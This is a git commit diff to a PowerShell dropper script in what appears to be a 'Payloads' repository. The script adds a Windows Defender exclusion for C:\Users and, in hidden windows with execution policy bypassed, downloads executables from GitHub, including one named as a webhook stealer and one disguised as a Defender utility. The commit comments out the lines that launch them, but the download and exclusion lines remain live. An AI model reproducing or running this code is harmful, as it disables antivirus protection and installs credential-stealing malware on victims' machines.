6eac44d8b2b57dc6d68dd8987c1f8227e4feb4ea
rude90 <115774095+rude90@users.noreply.github.com>
2023-07-30 08:02:50 -0700

    Update mfJtegnY.ps1

--- mfJtegnY.ps1
+++ mfJtegnY.ps1
@@ -7,11 +7,11 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/blob/main/PD-webhook-Stealer.exe -o C:\Users\system64.exe
-powershell.exe -w Hidden C:\Users\system64.exe
+# powershell.exe -w Hidden C:\Users\system64.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/PDF.exe -o C:\Users\PDF1.exe
-powershell.exe -w Hidden C:\Users\PDF1.exe
+# powershell.exe -w Hidden C:\Users\PDF1.exe
 
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+# powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
